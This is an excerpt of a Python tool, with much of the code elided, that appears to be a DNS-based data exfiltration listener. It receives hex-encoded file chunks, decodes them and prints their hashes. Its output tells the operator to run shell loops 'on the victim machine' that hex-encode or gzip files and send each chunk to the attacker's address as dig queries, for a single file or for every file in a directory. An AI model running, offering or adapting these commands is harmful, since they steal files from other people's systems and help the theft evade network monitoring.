    ...
    for (key, value) in r_data.items():
        ...
        if z:
            ...
            try:
                ...
                print(
                    "%s[Error]%s Data recieved for file '%s' does not look like hex-encoded data."
                    % (
                        c["r"],
                        c["e"],
                        fname,
        ...
        print(
            ...
            % (
                c["g"],
                c["e"],
                hashlib.md5(open(fname, "r").read()).hexdigest(),
            )
        )
...
if __name__ == "__main__":
    ...
    try:
        ...
        banner()
        print(
            "Usage: python %s [listen_address] [-z (optional: unzip incoming data)]"
            % sys.argv[0]
        )
        exit(1)
    ...
    print(
        "%s[+]%s Now on the victim machine, use any of the following commands (or similar):"
        % (
            c["y"],
            c["e"],
        )
    ...
    print(
        "\t%s[\x23]%s for b in $(xxd -p /path/to/file); do dig +short @%s $b.filename.com; done"
        % (
            c["r"],
            c["e"],
            ip,
    ...
    print(
        "\t%s[\x23]%s for b in $(gzip -c /path/to/file | xxd -p); do dig +short @%s $b.filename.com; done\n"
        % (
            c["r"],
            c["e"],
            ip,
    ...
    print(
        "\t%s[\x23]%s for f in $(ls *); do for b in $(xxd -p $f); do dig +short @%s $b.$f.com; done; done"
        % (
            c["r"],
            c["e"],
            ip,
    ...
    print(
        "\t%s[\x23]%s for f in $(ls *); do for b in $(gzip -c $f | xxd -p); do dig +short @%s $b.$f.com; done; done\n"
        % (
            c["r"],
            c["e"],
            ip,
    ...
    try:
        ...
        while 1:
            ...
            if ".." in p.data_text in key or "/" in p.data_text:
                print(
                    "%s[Error]%s Filename or data should not contain '..' or '/'\n%s[Error]%s Sorry, exiting..."
                    % (
                        c["r"],
                        c["e"],
                        c["r"],
